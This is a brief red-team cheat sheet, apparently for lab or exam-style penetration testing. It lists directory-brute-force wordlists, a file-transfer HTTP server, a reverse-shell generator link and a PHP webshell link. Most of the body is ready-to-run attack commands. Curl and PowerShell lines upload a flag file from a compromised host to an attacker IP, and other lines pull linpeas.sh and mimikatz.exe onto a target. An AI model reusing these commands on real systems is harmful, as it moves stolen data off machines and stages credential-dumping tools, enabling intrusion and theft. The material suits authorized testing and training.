# Red Team Cheat Sheet

---

# Web

## Directory Traversal

https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content

Commonly Used Dictionaries

```
# web/common.txt - 4743 Lines
https://raw.githubusercontent.com/voidexec/sec/main/web/common.txt

# web/big.txt - 20476 lines
https://raw.githubusercontent.com/voidexec/sec/main/web/big.txt

# web/directory-list-2.3-small.txt - 87664 lines
https://raw.githubusercontent.com/voidexec/sec/main/web/directory-list-2.3-small.txt

# web/directory-list-2.3-medium.txt - 220559 lines
https://raw.githubusercontent.com/voidexec/sec/main/web/directory-list-2.3-medium.txt

# web/directory-list-2.3-big.txt - 1273832 lines
https://raw.githubusercontent.com/voidexec/sec/main/web/directory-list-2.3-big.txt
```

## HTTP Server for Upload and Download

```
# Download
https://raw.githubusercontent.com/voidexec/sec/main/web/httpserver.py

# Start Server
python3 httpserver.py (default port 80)
python3 httpserver.py -p 8000

# Upload file with curl
curl -F 'file=@/home/ubuntu/Desktop/flag.txt' http://192.168.45.145/

# Download file with curl
curl -O http://192.168.45.145/linpeas.sh

# Upload with PowerShell
$FilePath="C:\Users\Administrator\Desktop\flag.txt"; $Url="http://192.168.45.145/"; $client=New-Object System.Net.Http.HttpClient; $content=New-Object System.Net.Http.MultipartFormDataContent; $fileStream=[System.IO.File]::OpenRead($FilePath); $content.Add((New-Object System.Net.Http.StreamContent($fileStream)), "file", [System.IO.Path]::GetFileName($FilePath)); $client.PostAsync($Url, $content).Result.Content.ReadAsStringAsync().Result

# Download with PowerShell
iwr -uri "http://192.168.45.145/mimikatz.exe" -OutFile "C:\Users\Public\mimikatz.exe"
```

# Shell

Reverse Shell Generator https://www.revshells.com/

```bash
# PHP One-liner webshell
https://raw.githubusercontent.com/voidexec/sec/main/webshells/shell.php
```